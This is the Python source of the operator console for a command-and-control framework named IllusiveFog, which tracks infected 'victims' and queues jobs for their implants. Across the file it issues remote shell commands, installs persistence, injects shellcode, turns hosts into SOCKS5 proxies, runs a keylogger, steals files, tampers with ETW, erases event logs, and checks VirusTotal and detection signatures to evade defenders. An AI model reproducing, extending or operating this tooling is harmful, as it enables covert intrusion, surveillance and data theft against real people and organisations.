#!/usr/bin/env python

import os,sys,cmd,glob
import thread
import configs
import http_server
import json
import traceback
import helper as he
from support import database
from support.signatures import shellcodes,shellcmd
from modules import moduleManager

#========================================================================================================================
"""
==========================
Configuration Variables
==========================
"""

c2_config = configs.configuration.c2
flask_opt = configs.configuration.flask
pluginConf = configs.configuration.plugin
pelletsConf = configs.configuration.pellets

#=========================================================================================================================
# custom exceptions used for nested menu navigation
class NavMain(Exception):
    """
    Custom exception class used to navigate to the 'main' menu.
    """
    pass

#=========================================================================================================================
"""
=============================================
EntryPoint of Program - Main Menu of IllusiveFog
=============================================

"""
class IllusiveFogMain(cmd.Cmd):
	def __init__(self):
		cmd.Cmd.__init__(self)
		self.prompt = "(IllusiveFog)> "
		self.doc_header = "Commands:"
		self.IllusiveFog_context = None
		self.menu_state = "Main"
		self.victimInteraction = None
		

	def cmdloop(self,line):
		while 1:
			try:
				if self.menu_state == "Victims":
					print "list all Victims"
				else:
					cmd.Cmd.cmdloop(self)
			except NavMain:
				self.menu_state = "Main"
			except KeyboardInterrupt as e:
				self.menu_state = "Main"
				try:
					choice = raw_input("\nExit?[y/n] ")
					if choice == "y":
						sys.exit()
					else:
						continue
				except KeyboardInterrupt as e:
					continue

	def parseline(self,line):
		"""All Lower-Case"""
		line = line.lower()
		return cmd.Cmd().parseline(line)

	def emptyline(self):
		pass
	def clear_context(self):
		self.prompt = "(IllusiveFog)> "
		emptyline()

	def do_exit(self,line):
		"""quit IllusiveFog"""
		exit = raw_input("\nExit? y/n > ")
		if exit == "y":
			print "[!] Exiting IllusiveFog"
			sys.exit(0)

	def do_help(self,line):
		print "\nHelp Menu\n========="
		print """
resetdb				- Reset/Empty DataBase to Fresh.
help 				- Help Menu.
listold 			- List about old victims.
interact 			- Interact with Victim.
exit 	 			- Exit.
		"""

#reset_db			- Reset/Empty DataBase to Fresh.	
	def	do_resetdb(self,line):
		database.resetDB()

#List old victims 	
 	def do_listold(self,line):
 		for i in os.listdir(he.CurrentPath()+"/victim_data/"):
 			print (i.replace(".json",""))
 		return


#Interact with Victim - IDK just thought dir traversing for victim records'd be easy?
 	def do_interact(self,line):
	 	if line != '':
	 		if line not in ''.join(os.listdir(he.CurrentPath()+"/victim_data/")).replace(".json",""):
	 			print("[-] Invalid Victim ID")
	 		else:
	 			print ("[+] Ready to interact With {0}".format(line))
	 			
	 			#self.prompt = "(IllusiveFog:"+line+")> "
	 			#victimInteraction = IllusiveFogVictimInteraction(line)
	 			#victimInteraction.cmdloop()
	 			self.DropVictimMenu(line).cmdloop()
	
	def DropVictimMenu(self,line):
		self.victimInteraction = IllusiveFogVictimInteraction(line)
		return self.victimInteraction

class SubMenu(cmd.Cmd):
	def __init__(self):
		cmd.Cmd.__init__(self)
		#self.mainMenu = mainMenu
		#self.line = self.parseline()
	def cmdloop(self):
		cmd.Cmd.cmdloop(self)
	
	def emptyline(self):
		pass

	# def parseline(self,line=None):
	#  	"""All Lower-Case"""
	#  	line = line.lower()
	#  	return cmd.Cmd().parseline(line)

#===============================================================================================================
#Victim Interaction Handler of IllusiveFog
#===============================================================================================================
"""
commands (C2 shell)			Commands Alias
------------------------------------------------------------------
1, shell<command>					0x004010D5 <command>
2, persistence<if param or NULL>	0x00401010 , 0x00401019<dll hijack>
3, injShellcode <shellcode>			0x004010C0<shellcode>
4, selfsocks5<if param or NULL>		0x004016FE
5, Load	<Path to file>				0x004018SS
6, VerboseRecon<NULL>				0x004017UU
7, UnldPlug (Unload Plugin)			0x0050140T
8, ETW 								0x0089AFD2
9; WNF								0x0063ADEF
10; EVTX							0x0046AF39
11; Keylogger						0x00547ASD
12; FetchFile						0x00895ASR
13; ProcessCamouflage				0x0089SDF3

Features										Status								Plugin			OPSEC
-----------------------------------------|----------------------------------|--------------------|-----------------
1;  cmd exec 							 |		Done						|		Yes			 |	Yes
2;  ETW									 |		Done						|		Yes			 |  YES
3;  WNF									 |      Intermediate				|					 |	N/A
4;  EVTX							     |		Done						|		YES			 |	YES
5;  self socks proxy				 	 |		Done						|		Yes			 |	N/A
6;  exe/dll loads (Add)					 |		Done						|		Yes			 |	N/A
7;  vt lookup (Add)						 |		Done						|		No			 |	N/A
8;  persistence							 |		Done						|		Yes			 |	N/A
9;  shellcode inj						 |		Done						|		Yes			 |	Yes
10; Unload Plugins						 |		Done						|		No 			 |  No
"""


class IllusiveFogVictimInteraction(SubMenu):

	def __init__(self,v_id):
		SubMenu.__init__(self)
		self.doc_header = 'Commands'
		self.v_id = v_id
		self.prompt = "(IllusiveFog:"+v_id+")> "
		self.dbAction=database.JobsTask()
		self.pluginsFolder = configs.configuration.pluginPath
		self.pelletsPath = configs.configuration.pelletsPath
		self.v_arch=database.Victim().FetchVictimArch(v_id)

		if self.v_arch == "x64":
				print "[INFO] Victim is x64 Architecture. x64 Arch Pellets will be used by default."
				self.pellet=self.pelletsPath+"/x64/"
		else:
				self.pellet = self.pelletsPath
			 
	# def parseline(self,line):
	#  	"""All Lower-Case"""
	#  	line = line.lower()
	#  	return SubMenu.parseline(line)
	
	def do_help(self,line):
		print """

Victim Interaction Capabilities:
===============================

info  				- Information about victim.
list				- List all victims.
jobs				- List all active jobs.
jobdel				- Delete any active Job.
remove				- Remove Victim from database.

shell 				- Command to be executed on Victim Machine's Shell.
persistence			- Install/Uninstall Persistence on Victim.
injShellcode			- Inject Shellcode on Victim Machine.
selfSocks5			- Turn Victim into a Socks5 Proxy itself.
VerboseRecon		- Verbose Recon On infected victim.
VTLook				- Check if Binaries are submitted on Virustotal.
Load				- Load EXE/DLL on Infected Host.
ETW				- Perform operations on ETW.
EVTX			 	- Perform Operations on EVTX. 
UnldPlug			- Unload a plugin.
Keylogger			- Keylogger.
FetchFile			- Steal files from Victim.
ProcessCamouflage   - Steal attributes of any target executable.  
Cleanup				- Close Connection with Victim. (Complete Removal)

back  				- Back to the main Menu.
		"""

#rename 				- Rename Victim.
#	def	do_rename(self,line):
#		query = "UPDATE Victims SET id='{0}' WHERE id='{1}';".format(line,v_id)
#		database.Victim().execute_query(query)
#		self.prompt

#Remove Victim.
	def	do_remove(self,line):
		query = "DELETE FROM Victims WHERE id = '{0}'".format(line)
		database.Victim().execute_query(query)

#job_del				- Delete Job
	def	do_jobdel(self,line):
		query = "DELETE FROM jobs WHERE jobID = '{0}'".format(line)
		database.JobsTask().execute_query(query)


#Show information about victim
	def do_info(self,line):
		"""Show information about Victim"""
		#print database.Victim().QueryVictim(self.v_id)
		try:
			ip= str(database.Victim().QueryVictim(self.v_id)[1])
			v_id= str(database.Victim().QueryVictim(self.v_id)[0])
			v_uname = str(database.Victim().QueryVictim(self.v_id)[2])
			v_hwid=str(database.Victim().QueryVictim(self.v_id)[3])
			v_os= str(database.Victim().QueryVictim(self.v_id)[4])
			v_priv= str(database.Victim().QueryVictim(self.v_id)[5])
			v_comKey= str(database.Victim().QueryVictim(self.v_id)[6])
			v_pluginsKey=str(database.Victim().QueryVictim(self.v_id)[7])
			v_pelletsKey=str(database.Victim().QueryVictim(self.v_id)[8])
			v_arch=database.Victim().QueryVictim(self.v_id)[9]
			
			print """
Informantion About Victim :
=========================
Proxy IP Address			: {0}
Username				: {1}
Name/ID 				: {2}
OS 					: {3}
hwid 					: {4}
Privileged				: {5}
Arch					: {9}
Communication Key			: {6}
Plugins Key				: {7}
Pellets Key				: {8}

	
				""".format(ip,v_uname,v_id,v_os,v_hwid,v_priv,v_comKey,v_pluginsKey,v_pelletsKey,v_arch)
		except TypeError:
			print "[!] This Victim is not in Database."
			pass
		except Exception as e:
			print e
			pass

#List All Jobs
	def do_jobs(self,line):
		database.JobsTask().ListAllJobs()

#List All Victims
	def do_list(self,line):
		database.Victim().print_all_data()

#Exec Shell Command
	def do_shell(self,line):
		if line == "":
			print ("[-] No Command issued")
		else:
			#print ("[+] Job Assigned for : {0}".format(self.v_id))
			self.checkJobType("shell",line)


#Attempt for Persistence	
	def do_persistence(self,line):
		line = line.lower()
		if line == "":
			launchPersist=moduleManager.arbitrarilyImportModule("persistence.persist").IllusiveFogModule(params=[self.v_id,"help"]).run()
		
		elif line == "install" or line == "uninstall":
			
				launchPersist=moduleManager.arbitrarilyImportModule("persistence.persist").IllusiveFogModule(params=[self.v_id,line]).run()
				if launchPersist == None or launchPersist == False: 
					print ""
				else:
					#print launchPersist
					self.checkJobType("persistence",launchPersist)
		
		else:
			launchPersist=moduleManager.arbitrarilyImportModule("persistence.persist").IllusiveFogModule(params=[self.v_id,"help"]).run()	
#Attempt for Shellcode Injection
	def do_injShellcode(self,line):
		line = line.split(" ")
		if line[0] == "":
			print ("[!] Specify a Shellcode to be injected \n ")
		else:
			self.checkJobType("injShellcode",line[0])

#Attempt to turn Host into Socks5 Proxy Server
	def do_selfSocks5(self,line):
		if line == "":
			print "[-] Define a port to open."
		else:
			self.checkJobType("selfSocks5",line)

#Attepmt for VT lookup incase bins are submitted
	def do_VTLook(self,line):
		print "\n[INFO] Checking if any artefacts submitted to Virustotal.\n"
		from support.signatures import VTCheck
		VT = configs.configuration.VT
		checkon = os.getcwd()+"/"+c2_config['PLUGINS_PATH']+"/"
		if VT['VTkey'] == "NONE":
			print "[!] API Key is not set, Please Set API Key in configuration."
		else:
			f = []
			for path, subdirs, files in os.walk(os.getcwd()):
				for name in files:
					listfile = os.path.join(path, name)
					listfile= listfile.split()
					for i in listfile:
						if checkon not in i:
							listfile.remove(i)
						else:
							f.append(i)
			
			VTCheck.VTChecker(VT['VTkey'],f)
#Loader for exe/dlls
	def do_Load(self,line):
		self.checkJobType("Load",line)

#Verbose Recon for infected host
	def do_VerboseRecon(self,line):
		self.plugin = pluginConf['VerboseRecon']
		if line == "":
			launchRecon=moduleManager.arbitrarilyImportModule("recon.recon").IllusiveFogModule(params=[self.v_id,"help",self.plugin]).run()
		else:
			launchRecon=moduleManager.arbitrarilyImportModule("recon.recon").IllusiveFogModule(params=[self.v_id,line,self.plugin]).run()
			#if type(launchRecon[0]) == None: 
			#	pass
			if launchRecon[0] == False:
				pass
			else:
				#print launchRecon
				self.checkJobType("VerboseRecon",launchRecon)

#Back to main menu	
	def do_back(self,line):
		raise NavMain

#Unload Plugins on Client	
	def do_UnldPlug(self,line):
		self.checkJobType("UnldPlug",line)

#Perform ETW Operations. 
	def do_ETW(self,line):
		if line == "":
			launchETW=moduleManager.arbitrarilyImportModule("etw.etw").IllusiveFogModule(params=[self.v_id,"help"]).run()
		else:
			launchETW=moduleManager.arbitrarilyImportModule("etw.etw").IllusiveFogModule(params=[self.v_id,line]).run()
			if launchETW == None: 
				print ""
			if launchETW == False:
				print ""
			else:
				print launchETW
				if raw_input("\n[WARNING] ETW Module is a Time Consuming and returns Long Output.\n[!]Would You wan't to continue?[y/n] : ") == "y":
					self.checkJobType("ETW",launchETW)
				else:
					print "[-] Operation Aborted!" 

#Perform WNF Operations. Currently: Fetching logs from Edge Browser.
#	def do_WNF(self,line):
#		if line == "":
#			launchWNF=moduleManager.arbitrarilyImportModule("wnf.wnf").IllusiveFogModule(params=[self.v_id,"help"]).run()
#		else:
#			launchWNF=moduleManager.arbitrarilyImportModule("wnf.wnf").IllusiveFogModule(params=[self.v_id,line]).run()
#			if launchWNF == None: 
#				print ""
#			if launchWNF == False:
#				print ""
#			else:
#				print launchWNF
#				self.checkJobType("WNF",launchWNF)
	
#Perform EVTX Operations. Currently: Logs Tampering/Erasing.
	def do_EVTX(self,line):
		if line == "":
			launchEVTX=moduleManager.arbitrarilyImportModule('evtx.evtx').IllusiveFogModule(params=[self.v_id,"help"]).run()
		
		else:
			launchEVTX=moduleManager.arbitrarilyImportModule('evtx.evtx').IllusiveFogModule(params=[self.v_id,line]).run()
			if launchEVTX == None: 
				print ""
			if launchEVTX == False:
				print ""
			else:
				#print launchEVTX
				if raw_input("\n[WARNING] ETW Module is a Time Consuming and returns Long Output.\n[!]Would You wan't to continue?[y/n]") == "y":
					self.checkJobType("EVTX",launchEVTX)
				else:
					print "[-] Operation Aborted!" 

#Initiat Cleanup jobs and drop victim.
	def do_Cleanup(self,line):
		self.checkJobType("Cleanup","")
	

#Initiate Keylogger.
	def do_Keylogger(self,line):
		self.checkJobType("Keylogger",line)

#Initiate File Stealer/Fetch Files.
	def do_FetchFile(self,line):
		if line == "":
			launchFF=moduleManager.arbitrarilyImportModule('FileFetcher.FileFetcher').IllusiveFogModule(params=[self.v_id,"help"]).run()
		
		else:
			launchFF=moduleManager.arbitrarilyImportModule('FileFetcher.FileFetcher').IllusiveFogModule(params=[self.v_id,line]).run()
			if raw_input("\n[WARNING] FileFetcher Module is a Time Consuming and runs in background consuming memory on Victim machine.\n[!]Would You wan't to continue?[y/n]") == "y":
					#print launchFF
					self.checkJobType("FetchFile",launchFF)
			else:
					print "[-] Operation Aborted!" 


#Perform Camouflage the process
	def do_ProcessCamouflage(self,line):
		self.checkJobType("ProcessCamouflage",line)

#==========================================================================================
#Pass job and attributes through "Mother/Handler/Implant"'s checks and add Alias.
#==========================================================================================

	def checkJobType(self,jobType,cmd_args=""):
		self.cmd_args = cmd_args
		#self.pluginsFolder = configs.configuration.pluginPath
		#self.pelletsPath = configs.configuration.pelletsPath
		
		jobid = "f_"+he.randomString()

		if jobType == None:
		 		self.Action = None
		 		return str(self.Action)

		#shell 				- Command to be executed on Victim Machine's Shell.	
		elif jobType == "shell":
			self.Action = "0x004010D5~ "
			plugin = self.pluginsFolder+pluginConf['shell']
			TempFiles="None"
			pellet = "None"
			#Check OPSEC_SAFETY
			if c2_config['OPSEC_SAFETY'] == "TRUE":
				shellcmdDetection = shellcmd.shellcmdsignaturedetector(r''+self.cmd_args)
				if len(shellcmdDetection) > 1:
					print "\n[OPSEC Alert] Signature Found : "
					for x in shellcmdDetection[0]:
						print "		Detections	  :",x[0]
						print "		Mitre ID	  :",x[1]
						print ""
					if raw_input("DO you still want to proceed execution?[y/n] ")[0] == "y": 
						self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
				else:
						print "[+] Executing \n"
						self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
			else:
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		#persistence			- Gain Persistence on Victim.
		elif jobType == "persistence":
				self.Action = "0x00401010~ "
				plugin = self.pluginsFolder+pluginConf['persistence']
				pellet = self.cmd_args[1]
				if self.cmd_args[0] == None:
					pass
				else:
					if pellet == True:
						pelletp = self.pellet+pelletsConf['LoaderPersistence']
					else:
						pelletp = "None"
					
					TempFiles="None"
					print "[+] Commanding Victim for Persistence Operation.\n"
					self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args[0],plugin,jobid,TempFiles,pelletp)

		#injShellcode		- Inject Shellcode on Victim Machine.
		elif jobType == "injShellcode":
				self.Action = "0x004010C0~ "
				plugin = self.pluginsFolder+pluginConf['injShellcode']
				TempFiles="None"
				pellet=self.pellet+pelletsConf['LoaderShellcode']
				#Check OPSEC_SAFETY 
				if c2_config['OPSEC_SAFETY'] == "TRUE":
					#Check if OPSEC is broke via signature detection 
					Shellcodecheck_detections = shellcodes.shellcodesignaturedetector(r''+self.cmd_args)
					print len(Shellcodecheck_detections)
					if len(Shellcodecheck_detections) > 1:
						if Shellcodecheck_detections[1] == 1:
									print '[OPSEC Alert] Signature Found : '+Shellcodecheck_detections[0]
									if raw_input("DO you still want to proceed execution?[y/n] ")[0] == "y":
										print self.cmd_args.replace("\\x","") 
										self.dbAction.AddJobs(self.v_id,self.Action + self.cmd_args.replace("\\x",""),plugin,jobid,TempFiles,pellet)
					else:
						print "[+] Attempting to Inject shellcode \n"
						print self.cmd_args.replace("\\x","")
						self.dbAction.AddJobs(self.v_id,self.Action + self.cmd_args.replace("\\x",""),plugin,jobid,TempFiles,pellet)
				else:

						print "[+] Attempting to Inject shellcode \n"
						print self.cmd_args.replace("\\x","")
						self.dbAction.AddJobs(self.v_id,self.Action + self.cmd_args.replace("\\x",""),plugin,jobid,TempFiles,pellet)
		
		#selfSocks5			- Turn Victim into a Socks5 Proxy itself.
		elif jobType == "selfSocks5":
				print "[+] Turning Victim into a Socks5 Server \n"
				self.Action = "0x004016FE~ "
				plugin = self.pluginsFolder+pluginConf['selfSocks5']
				TempFiles="None"
				pellet = "None"
				if database.Victim().FetchVictimPrivLvl(self.v_id) != "1":
					print "[-] Operation cannot be initiated since Victim is not privileged enough."
				else:
					self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		
		#Load				- Load EXE/DLL on Infected Host.
		elif jobType == "Load":
				self.Action = "0x004018SS~ "
				plugin = self.pluginsFolder+pluginConf['Load']
				TempFiles=r''+self.cmd_args
				pellet=self.pellet+pelletsConf['LoaderStager']
				self.dbAction.AddJobs(self.v_id,self.Action+he.GetFileName(TempFiles),plugin,jobid,TempFiles,pellet)
		
		#VerboseRecon			- Perform Local Verbose Recon on infected host. 
		elif jobType == "VerboseRecon":
				self.Action = "0x004017UU~ "
				self.cmmd = self.cmd_args[0]
				plugin = self.pluginsFolder+self.cmd_args[1]
				TempFiles="None"
				pellet = "None"
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmmd,plugin,jobid,TempFiles,pellet)

		#WNF
#		elif jobType == "WNF":
#			self.Action="0x0063ADEF~ "
#			plugin = self.pluginsFolder+pluginConf['WNF']
#			TempFiles="None"
#			pellet = "None"
#			print "[Status] Attempting operations on WNF."
#			self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		
		#EVTX	
		elif jobType == "EVTX":
			self.Action="0x0046AF39~ "
			plugin = self.pluginsFolder+pluginConf['EVTX']
			TempFiles="None"
			pellet = "None"
			print "[Status] Attempting operations on EVTX."
			self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		
		#ETW
		elif jobType == "ETW":
				self.Action="0x0089AFD2~ "
				plugin = self.pluginsFolder+pluginConf['ETW']
				TempFiles="None"
				pellet = "None"
				print "[Status] Attempting operations on ETW."
				print self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)

		#UnldPlug			- Unload a plugin.
		elif jobType =="UnldPlug":
				plugins = {
					'shell'         	:   '0x004010D5',
					'persistence'   	:   '0x00401010',
					'injShellcode'  	:	'0x004010C0',
					'selfsocks5'		:	'0x004016FE',
					'Load'				:   '0x004018SS',
					'VerboseRecon'		:	'0x004017UU',
					'ETW'				:	'0x0089AFD2',
#					'WNF'				:	'0x0063ADEF',
					'EVTX'				:	'0x0046AF39',
					'keylogger' 		: 	'0x00547ASD',
					'FetchFile' 		:	'0x00895ASR',
					'ProcessCamouflage' : 	'0x0089SDF3'
				}
				self.Action = "0x0050140T~ "
				plugin = "None"
				TempFiles="None"
				pellet = "None"
				for cmdType, cmdCode in plugins.items():
					if self.cmd_args in cmdType:
						print " [Status] Unloading Plugin :",self.cmd_args
						self.dbAction.AddJobs(self.v_id,self.Action + r''+(plugins[self.cmd_args]).encode("hex"),plugin,jobid,TempFiles,pellet)
						break
		elif jobType == "Cleanup":
				self.Action="0x004685964~ "
				plugin = self.pluginsFolder+pluginConf['CLEANUP']
				TempFiles="None"
				pellet = "None"
				print "[Status] Initiated CleanUp on Victim."
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		
		elif jobType == "Keylogger":
				self.Action="0x00547ASD~ "
				plugin = self.pluginsFolder+pluginConf['Keylogger']
				TempFiles="None"
				pellet = self.pellet+pelletsConf['KeyloggerPellet']
				print "[Status] Initiating Keylogger."
				print self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		
		elif jobType == "FetchFile":
				self.Action="0x00895ASR~ "
				plugin = self.pluginsFolder+pluginConf['FetchFile']
				TempFiles="None"
				pellet = self.pellet+pelletsConf['FetchFilePellet']
				print "[Status] Initiating File Fetcher."
				print self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		
		elif jobType == "ProcessCamouflage":
				self.Action="0x0089SDF3~ "
				plugin = self.pluginsFolder+pluginConf['ProcessCamouflage']
				TempFiles="None"
				pellet = "None"
				print "[Status] Impersonating Attributes of the given process."
				print self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet
				self.dbAction.AddJobs(self.v_id,self.Action + r''+self.cmd_args,plugin,jobid,TempFiles,pellet)
		else:
		 		print "[Error] No Such Command"
